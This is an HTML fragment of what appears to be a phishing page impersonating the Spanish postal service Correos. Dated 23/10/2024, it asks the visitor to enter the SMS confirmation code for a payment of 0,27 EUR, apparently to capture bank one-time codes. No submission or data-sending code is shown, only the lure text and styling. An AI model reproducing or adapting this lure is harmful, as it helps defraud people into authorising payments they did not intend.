        ...
        <main id="main" >
            <div class="container">
                ...
                <div class="login shadow dodg" >
                    ...
                    <div>
                        <p class="lead" style="font-weight: 500;font-size: 15px;color: rgba(0, 0, 0,0.7);">Para confirmar la operación, introduzca la clave que le hemos enviado por SMS a su móvil</p>
                        <p class="lead" style="font-weight: 600;font-size: 16px;">Está realizando un pago en CORREOS por la cantidad de 0,27 EUR el 23/10/2024</p>
                    </div>
